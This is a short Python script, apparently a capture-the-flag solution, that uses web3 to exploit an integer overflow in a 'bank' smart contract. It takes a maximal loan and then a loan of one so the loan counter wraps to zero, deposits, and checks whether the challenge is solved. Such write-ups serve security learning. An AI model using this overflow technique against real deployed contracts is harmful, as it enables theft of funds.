from web3 import Web3, HTTPProvider
import json
web3 = Web3(HTTPProvider("http://34.42.229.254:49181")) # Replace with the actual RPC
contract_address = "0xdB5328eB60E290E91a54d6f07041D4D72470567E" # Replace with the actual contract address
wallet="0x8a55071316bb6b0E7cd88fC5673E858d07C7dC4a" # Replace with the actual wallet

f = open('./abi','r') # Open the program's abi (can be easily generated since you have the source code)
contract_json=json.load(f)

abi=contract_json['abi']
bank = web3.eth.contract(address=contract_address,abi=abi)
bank.functions.loan(2**48-1).transact({'from':wallet}) # Take a loan of maximum minus one
bank.functions.loan(1).transact({'from':wallet}) # Take a loan of one, overflowing the loan variable. It is now zero!
bank.functions.deposit(2**48-1).transact({'from':wallet,'value':2**48-1}) # Deposit the required ammount


print(bank.functions.isChallSolved().call()) # It is now solved. Go get the flag!
